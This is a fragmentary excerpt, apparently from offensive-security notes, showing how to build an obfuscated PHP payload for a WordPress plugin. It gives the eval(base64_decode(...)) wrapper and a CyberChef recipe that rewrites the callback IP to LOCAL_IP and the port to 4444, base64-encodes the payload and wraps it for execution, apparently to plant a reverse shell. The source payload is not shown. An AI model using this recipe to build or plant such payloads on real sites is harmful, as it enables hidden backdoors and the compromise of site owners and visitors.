...
```php
<?php eval(base64_decode($BASE64_PAYLOAD)); ?>
```
...
Cyberchef WP Plugin Recipe:
----
Input Base64:
```text
.
```
...
[
  ...
  { "op": "Find / Replace",
    "args": [{ "option": "Regex", "string": "(?:(?:\\d|[01]?\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d|\\d)(?:\\/\\d{1,2})?" }, "LOCAL_IP", true, false, true, false] },
  { "op": "Find / Replace",
    "args": [{ "option": "Regex", "string": "8888" }, "4444", true, false, true, false] },
  { "op": "To Base64",
    "args": ["A-Za-z0-9+/="] },
  { "op": "Find / Replace",
    "args": [{ "option": "Regex", "string": "^(.+)$" }, "<?php eval(base64_decode($&)); ?>", true, false, true, false] }
]
```
